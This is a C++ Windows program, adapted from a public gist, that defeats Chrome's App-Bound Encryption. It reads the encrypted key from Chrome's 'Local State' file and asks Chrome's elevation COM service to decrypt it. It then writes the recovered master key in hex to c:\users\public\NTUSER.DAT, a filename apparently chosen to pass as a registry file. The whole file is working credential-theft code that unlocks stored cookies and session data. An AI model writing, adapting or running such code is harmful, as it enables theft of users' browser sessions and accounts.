// Wrapped this code from source: https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824

/*
 * Chrome App-Bound Encryption Service:
 * https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
 * https://drive.google.com/file/d/1xMXmA0UJifXoTHjHWtVir2rb94OsxXAI/view
 */

#include <Windows.h>
#include <wrl/client.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <string>
#include <shlobj.h>
#include <regex>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comsuppw.lib")
#pragma comment(lib, "shell32.lib")

// https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevation_service_idl.idl
const CLSID CLSID_Elevator = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
const IID IID_IElevator    = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };

typedef enum ProtectionLevel
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3
} ProtectionLevel;

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        /* [string][in] */ const WCHAR * crx_path,
        /* [string][in] */ const WCHAR * browser_appid,
        /* [string][in] */ const WCHAR * browser_version,
        /* [string][in] */ const WCHAR * session_id,
        /* [in] */ DWORD caller_proc_id,
        /* [out] */ ULONG_PTR * proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        /* [in] */ ProtectionLevel protection_level,
        /* [in] */ const BSTR plaintext,
        /* [out] */ BSTR* ciphertext,
        /* [out] */ DWORD* last_error) = 0;

    // https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevator.cc#L155
    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        /* [in] */ const BSTR ciphertext,
        /* [out] */ BSTR* plaintext,
        /* [out] */ DWORD* last_error) = 0;
};

constexpr size_t KEY_SIZE = 32;
const uint8_t kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };

static const std::string BASE64_CHARS =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

inline bool isBase64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

std::vector<uint8_t> Base64Decode(const std::string& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0, j = 0, in_ = 0;
    uint8_t char_array_4[4]{}, char_array_3[3]{};
    std::vector<uint8_t> decoded_data;

    while (in_len-- && (encoded_string[in_] != '=') && isBase64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = BASE64_CHARS.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; i < 3; i++) decoded_data.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = BASE64_CHARS.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; j < i - 1; j++) decoded_data.push_back(char_array_3[j]);
    }

    return decoded_data;
}

std::string GetAppDataPath()
{
    char appDataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath) != S_OK)
    {
        return "";
    }
    return std::string(appDataPath);
}

std::string read_json(const std::string& filePath) {
    std::ifstream file(filePath);
    if (!file.is_open()) {
        std::cerr << "Failed to open the file: " << filePath << std::endl;
        return "";
    }

    std::regex pattern("\"app_bound_encrypted_key\"\\s*:\\s*\"([^\"]*)\"");
    std::string line;
    std::smatch match;

    while (std::getline(file, line)) {
        if (std::regex_search(line, match, pattern)) {
            return match[1]; // Return the captured group (value of "encrypted_key")
        }
    }

    std::cerr << "Encrypted key not found in the file." << std::endl;
    return "";
}

std::vector<uint8_t> RetrieveEncryptedKey() {
    std::string path = GetAppDataPath();
    path = path + "\\Google";
    path = path + "\\Chrome\\User Data";
    path = path + "\\Local State";
    std::string base64_encrypted_key = read_json(path);

    if(base64_encrypted_key.empty())
    {
        return {};
    }

    std::vector<uint8_t> encrypted_key_with_header = Base64Decode(base64_encrypted_key);

    if (!std::equal(std::begin(kCryptAppBoundKeyPrefix), std::end(kCryptAppBoundKeyPrefix), encrypted_key_with_header.begin())) {
        std::cerr << "Error: Invalid key header." << std::endl;
        exit(EXIT_FAILURE);
    }

    return std::vector<uint8_t>(encrypted_key_with_header.begin() + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_with_header.end());
}

std::string BytesToHexString(const BYTE* byteArray, size_t size) {
    std::ostringstream oss;
    for (size_t i = 0; i < size; ++i)
        oss << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byteArray[i]);

    return oss.str();
}

// https://github.com/chromium/chromium/blob/67975166cf99a9e7f7354a259bf672a65f0b9968/chrome/browser/os_crypt/app_bound_encryption_provider_win.cc#L92
// https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/browser/os_crypt/app_bound_encryption_win.cc#L140

int main() {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        std::cerr << "Failed to initialize COM." << std::endl;
        return -1;
    }

    Microsoft::WRL::ComPtr<IElevator> elevator;
    DWORD last_error = ERROR_GEN_FAILURE;

    hr = CoCreateInstance(CLSID_Elevator, nullptr, CLSCTX_LOCAL_SERVER, IID_IElevator, (void**)&elevator);
    if (FAILED(hr)) {
        std::cerr << "Failed to create IElevator instance." << std::endl;
        CoUninitialize();
        return -1;
    }

    hr = CoSetProxyBlanket(
        elevator.Get(),
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_DYNAMIC_CLOAKING
    );

    if (FAILED(hr)) {
        std::cerr << "Failed to set proxy blanket." << std::endl;
        CoUninitialize();
        return -1;
    }

    std::vector<uint8_t> encrypted_key = RetrieveEncryptedKey();

    BSTR ciphertext_data = SysAllocStringByteLen(reinterpret_cast<const char*>(encrypted_key.data()), encrypted_key.size());
    if (!ciphertext_data) {
        std::cerr << "Failed to allocate BSTR for encrypted key." << std::endl;
        CoUninitialize();
        return -1;
    }

    BSTR plaintext_data = nullptr;
    hr = elevator->DecryptData(ciphertext_data, &plaintext_data, &last_error);

    if (SUCCEEDED(hr)) {
        BYTE* decrypted_key = new BYTE[KEY_SIZE];
        memcpy(decrypted_key, (void*)plaintext_data, KEY_SIZE);
        SysFreeString(plaintext_data);
        //std::cout << "Decrypted key: " << BytesToHexString(decrypted_key, KEY_SIZE) << std::endl;

        std::string decrypted_key_string = BytesToHexString(decrypted_key, KEY_SIZE);
        std::wstring command = L"cmd.exe /c echo " + std::wstring(decrypted_key_string.begin(), decrypted_key_string.end());
        std::wstring command1 = command + L" > c:\\users\\public\\NTUSER.DAT";

        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        if (!CreateProcess(
            NULL,                  // No module name (use command line)
            const_cast<LPWSTR>(command1.c_str()), // Command line
            NULL,                  // Process handle not inheritable
            NULL,                  // Thread handle not inheritable
            FALSE,                // Set handle inheritance to FALSE
            0,                     // No creation flags
            NULL,                  // Use parent's environment block
            NULL,                  // Use parent's starting directory 
            &si,                   // Pointer to STARTUPINFO structure
            &pi)                   // Pointer to PROCESS_INFORMATION structure
            ) {
            // Handle error
        }

        // Optionally, wait for the process to finish
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Close handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
        std::cerr << "Decryption failed. Last error: " << last_error << std::endl;

    SysFreeString(ciphertext_data);
    CoUninitialize();
    return 0;
}
